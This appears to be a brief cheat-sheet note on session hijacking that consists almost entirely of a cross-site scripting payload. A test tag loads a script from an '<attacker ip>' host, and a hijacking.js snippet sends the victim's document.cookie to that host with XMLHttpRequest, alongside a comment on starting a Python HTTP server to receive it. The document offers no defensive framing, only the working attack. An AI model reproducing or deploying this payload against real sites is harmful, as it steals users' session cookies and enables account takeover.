Session Hijacking

test file

```js
// remote script
<script src="http://<attacker ip>/empty.js"></script>
```

hijacking.js

```js
// sudo python3 -m http.server 80
var oReq = new XMLHttpRequest();
oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
oReq.send()
```